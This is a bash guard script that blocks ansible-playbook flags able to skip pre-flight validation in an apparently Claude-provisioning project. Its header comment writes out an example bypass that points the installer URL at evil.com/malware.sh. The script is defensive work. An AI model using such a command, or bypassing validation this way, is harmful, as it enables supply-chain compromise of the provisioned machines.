#!/usr/bin/env bash
# SECURITY: Reject --start-at-task flag and other dangerous ansible-playbook flags
# to prevent bypassing pre-flight validation checks.
#
# Vulnerability: Ansible's --start-at-task skips pre_tasks (even with tags: [always]),
# allowing an attacker to bypass validation by running:
#   ansible-playbook site.yml --start-at-task '<task-name>' -e 'claude_install_url=https://evil.com/malware.sh'
#
# Defense-in-depth layers:
#   1. Makefile VERIFY_AND_RUN calls this script (Makefile layer — blocks direct users)
#   2. site.yml Play 0 has tags: [always] with pre-flight checks (Ansible layer)
#   3. site.yml Play 2 re-runs pre-flight checks (Ansible layer — survives --skip-tags always)
#   4. roles/claude/tasks/main.yml has no-tag defense-in-depth assertion (role layer)

set -euo pipefail

# Collect all command-line arguments after the script name
args=("$@")

# Reject dangerous flags
declare -a dangerous_flags=(
    '--start-at-task'
    '--start-task'  # alternative form
    '--skip-tags'   # allows --skip-tags always to bypass Play 0
    '--tags'        # allows --tags <single-role> to skip pre-flight
)

# Check each argument against dangerous flags
for arg in "${args[@]}"; do
    # Extract flag name (everything before = if present)
    flag_name="${arg%%=*}"

    for dangerous in "${dangerous_flags[@]}"; do
        if [[ "$flag_name" == "$dangerous" ]]; then
            cat >&2 <<EOF
ERROR: Dangerous Ansible flag rejected by VERIFY_AND_RUN
Flag: $flag_name
Reason: This flag bypasses pre-flight security checks in site.yml
        (pre_tasks with tags: [always] are skipped when using --start-at-task,
         and single-role --tags/--skip-tags bypass critical assertions).

SECURITY RISK: Using this flag allows:
  - Skipping validation of claude_install_url, config.yml injection guards, etc.
  - Supply-chain attack via attacker-controlled installer URLs
  - INI/shell/SSTI injection via unsanitized config.yml variables

Solution: Run 'make all' or 'make <role>' without --start-at-task.
For partial provisioning, use: make <role> (e.g. make claude, make packages)

If you need to resume provisioning at a specific point:
  1. Consider running a scoped make target instead (make ssh, make dotfiles, etc.)
  2. For testing: use ansible-playbook directly with --check mode and full validation
  3. Document your use case in a GitHub issue if this is blocking legitimate workflow

EOF
            exit 1
        fi
    done
done

# Verify collections integrity (defense-in-depth: supply chain verification)
scripts/verify-collections.sh

# All checks passed; caller should proceed with ansible-playbook
